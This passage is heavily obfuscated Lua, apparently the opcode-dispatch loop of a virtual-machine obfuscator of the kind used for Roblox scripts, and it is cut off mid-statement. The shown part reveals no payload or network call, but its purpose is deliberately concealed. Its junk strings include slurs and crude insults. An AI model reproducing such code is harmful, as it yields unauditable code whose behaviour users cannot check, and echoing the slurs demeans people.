=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[x]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[b]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[k]]=e[_];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[w]][e[h]]=l[e[M]];o=o+d;e=n[o];l[e[b]][e[c]]=e[D];o=o+d;e=n[o];l[e[r]][e[t]]=e[N];o=o+d;e=n[o];l[e[w]][e[u]]=e[D];o=o+d;e=n[o];l[e[i]][e[U]]=e[B];o=o+d;e=n[o];l[e[i]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[U]]=l[e[P]];o=o+d;e=n[o];l[e[w]][e[k]]=e[D];o=o+d;e=n[o];l[e[i]]=f[e[h]];break end while 1693==(a)/((292024/0xd3))do local _;local a;l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[M]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[x]]=y[e[t]];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[D]];o=o+d;e=n[o];a=e[r];_=l[e[h]];l[a+1]=_;l[a]=_[e[M]];break end;break;end break;end break;end break;end break;end while(a)/((0x87+-71))==1425 do a=(1495912)while C<=(0x1790/58)do a-= a a=(12401532)while(0x43ad/(-0x39+232))>=C do a-= a a=(4445280)while C<=(((984528/0x36)/0xac)+-#[[Crackzzzz]])do a-= a a=(2403288)while C>(-35+0x83)do a-= a local a;l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[O]]=l[e[k]];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]();break end while(a)/(((376812/0x36)-3525))==696 do local d=e[r];local a=l[d+2];local n=l[d]+a;l[d]=n;if(a>0)then if(n<=l[d+1])then o=e[u];l[d+3]=n;end elseif(n>=l[d+1])then o=e[h];l[d+3]=n;end break end;break;end while(a)/((-#[[Impulse youtube real]]+(0x812+-86)))==2268 do a=(12734160)while C>(882/0x9)do a-= a l[e[r]][l[e[U]]]=l[e[N]];break end while(a)/(((0x188a25-804139)/0xf5))==3880 do local a;l[e[w]]=e[t];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[h]]=l[e[P]];o=o+d;e=n[o];l[e[w]][e[c]]=e[P];o=o+d;e=n[o];l[e[r]][e[c]]=e[P];o=o+d;e=n[o];l[e[b]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[r]][e[h]]=l[e[P]];o=o+d;e=n[o];l[e[O]][e[c]]=l[e[B]];o=o+d;e=n[o];l[e[b]][e[c]]=e[N];o=o+d;e=n[o];l[e[x]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[O]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[x]][e[c]]=e[N];o=o+d;e=n[o];l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[O]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[i]]=f[e[u]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[x]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[i]][e[c]]=e[N];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[r]][e[h]]=l[e[_]];o=o+d;e=n[o];l[e[w]][e[t]]=e[_];o=o+d;e=n[o];l[e[x]][e[c]]=e[B];o=o+d;e=n[o];l[e[O]]=f[e[u]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[O]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[r]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[r]][e[c]]=e[_];o=o+d;e=n[o];l[e[i]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[w]][e[c]]=l[e[P]];o=o+d;e=n[o];l[e[i]][e[u]]=e[N];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[r]]=e[h];break end;break;end break;end while 3146==(a)/((-#[[panzerfaust]]+(3972+-0x13)))do a=(3844324)while C<=(310-0xd1)do a-= a a=(2478600)while(21500/0xd7)<C do a-= a local x=v[e[t]];local r;local d={};r=L({},{__index=function(o,e)local e=d[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=d[e]e[1][e[2]]=o;end;});for a=1,e[P]do o=o+S;local e=n[o];if e[((1870/0xaa)+-#"bigchungus")]==56 then d[a-1]={l,e[h]};else d[a-1]={y,e[h]};end;z[#z+1]=d;end;l[e[i]]=A(x,r,f);break end while 1700==(a)/((-34+0x5d4))do local o=e[b]local a={l[o](s(l,o+1,g))};local n=0;for e=o,e[B]do n=n+d;l[e]=a[n];end break end;break;end while(a)/(((45500/0x19)+-#"atakan der nigga"))==2131 do a=(2489665)while C<=(-#'send nudes'+(196+-0x54))do a-= a local e=e[x]l[e]=l[e](l[e+S])break;end while 1387==(a)/(((3728-0x770)+-#'Fucking losed 027728272728271'))do a=(10006038)while((296-0xac)+-#'this is a meme string')<C do a-= a local e=e[r]l[e]=l[e](s(l,e+d,g))break end while 2781==(a)/((395780/0x6e))do local a;l[e[b]]=y[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[O]][e[k]]=e[D];o=o+d;e=n[o];l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[x]]=y[e[h]];o=o+d;e=n[o];a=e[O]l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=y[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[r]][e[h]]=e[_];o=o+d;e=n[o];do return end;break end;break;end break;end break;end break;end while(a)/((-#'nerd'+(-0x4f+847)))==1958 do a=(6816616)while(19511/0xb3)>=C do a-= a a=(1085313)while C<=(-0x75+(0x1e4-261))do a-= a a=(4805465)while(0xf6-141)<C do a-= a l[e[O]][e[h]]=l[e[B]];break end while(a)/((-#[[Nsrds GAYYYYAIAHAKAJAVAHAUA]]+(2782-0x58e)))==3605 do local o=e[r]l[o](s(l,o+S,e[u]))break end;break;end while 3319==(a)/((0x2ef-(-#"0nly 1337"+(-0x39+490))))do a=(766675)while(27178/0xfe)>=C do a-= a local a;l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])break;end while(a)/((0x3ff-568))==1685 do a=(2062341)while C>(-#'Faggot'+(161+-0x2f))do a-= a local t;local a;l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[b]]=y[e[u]];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[x]]=l[e[c]][e[N]];o=o+d;e=n[o];a=e[x];t=l[e[k]];l[a+1]=t;l[a]=t[e[_]];break end while(a)/((557685/0xff))==943 do local a;l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[i]]=l[e[t]];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]();break end;break;end break;end break;end while 2468==(a)/(((515406/0xba)+-#'0nly 1337'))do a=(904959)while C<=(-#'yeet'+(0x15f-236))do a-= a a=(1338528)while C>((0x2480/73)+-#'free bobux no skem')do a-= a local x;local a;a=e[r];x=l[e[k]];l[a+1]=x;l[a]=x[e[_]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]]=l[e[U]][e[_]];o=o+d;e=n[o];a=e[b];x=l[e[c]];l[a+1]=x;l[a]=x[e[P]];break end while 3504==(a)/((875-0x1ed))do l[e[r]]=l[e[k]];break end;break;end while 297==(a)/(((241424/0x4f)+-#'0nly segc'))do a=(10629360)while C<=(((-0x74+385)+-#'deadphonelua')-145)do a-= a do return end;break;end while 3885==(a)/(((0xab540/255)+-0x10))do a=(1730034)while C>(248-0x87)do a-= a if(l[e[i]]==e[D])then o=o+S;else o=e[u];end;break end while(a)/((-#[[windows xp startup sfx]]+(0x3fb4/36)))==4014 do local a;l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[D]];o=o+d;e=n[o];l[e[w]]=l[e[k]];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]();break end;break;end break;end break;end break;end break;end break;end while(a)/((3273-0x67d))==3640 do a=(3489270)while(0x6445/193)>=C do a-= a a=(5554736)while(0x4ecc/164)>=C do a-= a a=(3333088)while C<=(((4926-0x9af)+-#"when the he went where when he where where when the he when ther wher he then here went")/0x14)do a-= a a=(1005438)while C<=((16569+-0x61)/0x8e)do a-= a a=(341379)while(-0x23+150)<C do a-= a local o=e[b]local a={l[o](s(l,o+1,g))};local n=0;for e=o,e[_]do n=n+d;l[e]=a[n];end break end while(a)/((1595-(1780-0x3a4)))==457 do local o=e[b]l[o]=l[o](s(l,o+d,e[t]))break end;break;end while(a)/((0x269+-99))==1941 do a=(1320636)while C>(-#"Ur mom"+(0x1cd4/60))do a-= a local a;l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[x]]=l[e[k]];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]();break end while 1002==(a)/((-#"Crackzzzz"+(0xa7c-1357)))do l[e[r]]={};break end;break;end break;end while 2992==(a)/(((0x8d6-1140)+-#"Gay porn"))do a=(3711510)while C<=((0x1039-2113)/0x11)do a-= a a=(3222420)while(0x15a-227)<C do a-= a do return l[e[b]]end break end while 860==(a)/((7528-0xec5))do l[e[i]]=f[e[h]];break end;break;end while(a)/((0x884-1145))==3586 do a=(6227552)while(24200/0xc8)>=C do a-= a local a;l[e[i]]=e[c];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[k]]=l[e[D]];o=o+d;e=n[o];l[e[w]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[k]]=l[e[M]];o=o+d;e=n[o];l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[x]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[w]][e[t]]=e[M];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[i]][e[c]]=e[_];o=o+d;e=n[o];l[e[x]][e[u]]=e[P];o=o+d;e=n[o];l[e[i]][e[u]]=e[P];o=o+d;e=n[o];l[e[O]][e[k]]=e[B];o=o+d;e=n[o];l[e[b]][e[k]]=l[e[D]];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[O]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[c]]=e[P];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[D]];o=o+d;e=n[o];l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[M]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[O]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[i]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[w]][e[U]]=e[N];o=o+d;e=n[o];l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[k]]=l[e[B]];o=o+d;e=n[o];l[e[r]][e[t]]=e[D];o=o+d;e=n[o];l[e[b]][e[h]]=e[D];o=o+d;e=n[o];l[e[x]][e[h]]=e[B];o=o+d;e=n[o];l[e[O]][e[t]]=e[M];o=o+d;e=n[o];l[e[b]][e[c]]=l[e[B]];o=o+d;e=n[o];l[e[O]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[_]];o=o+d;e=n[o];l[e[w]][e[k]]=e[P];break;end while(a)/((-0x48+2344))==2741 do a=(10305058)while C>((-55+0xc9)+-#"fatee is gay 0nly on top")do a-= a l[e[w]]=e[t];break end while(a)/((0x1dfe-3881))==2714 do if(l[e[r]]==e[P])then o=o+S;else o=e[h];end;break end;break;end break;end break;end break;end while(a)/((1732+-0x1a))==3256 do a=(11667496)while C<=(-#[[Deezbutts]]+(207+-0x46))do a-= a a=(10061225)while C<=(0x162-229)do a-= a a=(312512)while(0xfb+(-0x3e82/126))<C do a-= a local a;l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[b]]=l[e[h]];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]();break end while(a)/((0xcece/103))==608 do local a;l[e[O]]=e[c];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[r]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[U]]=e[D];o=o+d;e=n[o];l[e[x]][e[u]]=e[M];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[_]];o=o+d;e=n[o];l[e[x]][e[h]]=l[e[M]];o=o+d;e=n[o];l[e[O]][e[t]]=e[_];o=o+d;e=n[o];l[e[O]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[i]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[i]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[i]][e[U]]=e[_];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[r]][e[t]]=l[e[N]];o=o+d;e=n[o];l[e[x]][e[t]]=e[N];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[D]];o=o+d;e=n[o];l[e[i]][e[t]]=e[M];o=o+d;e=n[o];l[e[i]][e[u]]=e[_];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[i]][e[u]]=l[e[M]];o=o+d;e=n[o];l[e[r]][e[U]]=e[_];o=o+d;e=n[o];l[e[x]][e[t]]=l[e[B]];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[x]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[w]][e[u]]=e[N];o=o+d;e=n[o];l[e[w]]=f[e[t]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[M]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[r]]=e[t];break end;break;end while 3725==(a)/((0x1551-2756))do a=(813656)while C<=(-68+0xc2)do a-= a local a;local i;local P,B;local C;local 